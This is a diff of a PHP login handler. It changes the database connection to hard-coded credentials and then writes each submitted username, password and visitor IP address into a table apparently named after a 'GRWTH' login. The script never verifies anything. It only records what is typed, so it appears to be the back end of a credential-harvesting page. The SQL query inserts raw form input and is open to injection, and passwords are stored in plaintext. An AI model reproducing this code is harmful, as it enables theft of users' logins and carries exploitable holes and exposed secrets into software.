@@ -5,18 +5,18 @@
  *  Last Change/Update: 08/26/2020
 */
 
-  $con = mysqli_connect('localhost:3306','root','');
+  $con = mysqli_connect('localhost:3306','aismarth_login','grwthlogin');
 
   if(!$con){
     echo "Not connected to server";
   }
 
-  if(!mysqli_select_db($con,'test_database')){
+  if(!mysqli_select_db($con,'aismarth_grwth')){
     echo "Database not selected";
   }
 
-  $username = $_POST['Username'];
-  $password = $_POST['Password'];
+  $username = $_POST['username'];
+  $password = $_POST['password'];
 
   //whether ip is from share internet
   if (!empty($_SERVER['HTTP_CLIENT_IP']))
@@ -34,7 +34,7 @@
       $ip_address = $_SERVER['REMOTE_ADDR'];
     }
 
-  $sql = "INSERT INTO login_table(username,password,ip_address)
+  $sql = "INSERT INTO grwth_login(username,password,ip_address)
           VALUES ('$username','$password','$ip_address')";
 
   if(!mysqli_query($con,$sql)){
